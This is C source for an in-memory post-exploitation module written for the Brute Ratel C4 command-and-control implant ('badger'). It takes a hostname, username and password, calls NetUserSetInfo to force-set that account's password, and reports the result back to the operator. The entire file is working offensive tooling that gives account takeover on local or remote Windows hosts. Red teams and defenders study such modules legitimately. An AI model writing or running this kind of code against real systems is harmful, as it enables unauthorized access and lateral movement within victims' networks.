#include <windows.h>
#include <stdio.h>
#include <lmaccess.h>
#include <lmerr.h>
#include "../badger_exports.h"

DECLSPEC_IMPORT WINBASEAPI int WINAPI Kernel32$MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
DECLSPEC_IMPORT NET_API_STATUS WINAPI Netapi32$NetUserSetInfo(LPCWSTR servername,LPCWSTR username,DWORD level,LPBYTE buf,LPDWORD parm_err);

VOID setuserpass(WCHAR* server, WCHAR* username, WCHAR* password) {
	USER_INFO_1003 newpass = {0};
	NET_API_STATUS ret = NERR_Success;
	DWORD parm_err = 0;
	newpass.usri1003_password = password;
	ret = Netapi32$NetUserSetInfo(server, username, 1003, (LPBYTE) &newpass, &parm_err);
	if (ret != NERR_Success) {
		BadgerDispatch(g_dispatch, "[-] Error NetUserSetInfo: %lu\n", ret);
		return;
	}
	BadgerDispatch(g_dispatch, "[+] Success\n");
}

VOID ConvertCharToWChar(char* charString, wchar_t** wcharString) {
    int size_needed = Kernel32$MultiByteToWideChar(CP_ACP, 0, charString, -1, NULL, 0);
    *wcharString = (wchar_t*) BadgerAlloc(size_needed * sizeof(wchar_t));
    if (*wcharString) {
        Kernel32$MultiByteToWideChar(CP_ACP, 0, charString, -1, *wcharString, size_needed);
    }
}

void coffee(char **argv, int argc, WCHAR** dispatch) {
	g_dispatch = dispatch;
	if (argc < 3) {
		BadgerDispatch(dispatch, "[!] Usage: change_pass.o <hostname> <username> <password>\n");
		return;
	}
	DWORD dwErrorCode = ERROR_SUCCESS;
	WCHAR *hostname = NULL;
	WCHAR *username = NULL;
	WCHAR *password = NULL;
	ConvertCharToWChar(argv[0], &hostname);
	ConvertCharToWChar(argv[1], &username);
	ConvertCharToWChar(argv[2], &password);
	BadgerDispatch(dispatch, "[+] Setting password: %ls\\%ls => %ls\n", hostname, username, password);
	setuserpass(hostname, username, password);
    BadgerFree((PVOID*)&hostname);
    BadgerFree((PVOID*)&username);
    BadgerFree((PVOID*)&password);
}